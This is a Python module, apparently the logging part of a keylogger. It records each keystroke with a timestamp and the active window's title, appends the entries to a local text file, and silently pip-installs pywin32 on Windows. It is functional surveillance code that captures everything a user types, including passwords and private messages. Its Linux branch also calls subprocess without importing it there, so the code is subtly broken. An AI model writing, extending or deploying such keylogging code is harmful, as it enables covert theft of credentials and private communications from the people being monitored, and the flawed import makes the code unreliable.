# keystroke.py
import os
import platform
import logging
from datetime import datetime

def get_active_window():
    """Get the title of the active window, cross-platform."""
    try:
        if platform.system() == "Windows":
            try:
                import win32gui
            except ImportError:
                import subprocess
                import sys
                subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32"])
                import win32gui
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        elif platform.system() == "Linux":
            try:
                result = subprocess.run(["xdotool", "getactivewindow", "getwindowname"], 
                                       capture_output=True, text=True, check=True)
                return result.stdout.strip()
            except subprocess.CalledProcessError:
                return "Unknown Window (xdotool not installed)"
        else:
            return "Unsupported OS"
    except Exception as e:
        logging.error(f"Error getting active window: {e}")
        return "Unknown Window"

def log_keystrokes(file_path, key):
    """Log keystrokes with context to a file."""
    try:
        key_str = str(key).replace("'", "")
        if key_str.startswith("Key."):
            key_str = f"[{key_str[4:].upper()}]"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        window = get_active_window()
        log_entry = f"[{timestamp}] Window: {window} | Key: {key_str}\n"
        
        with open(os.path.join(file_path, "f_keystroke.txt"), "a") as f:
            f.write(log_entry)
    except Exception as e:
        logging.error(f"Error logging keystroke: {e}")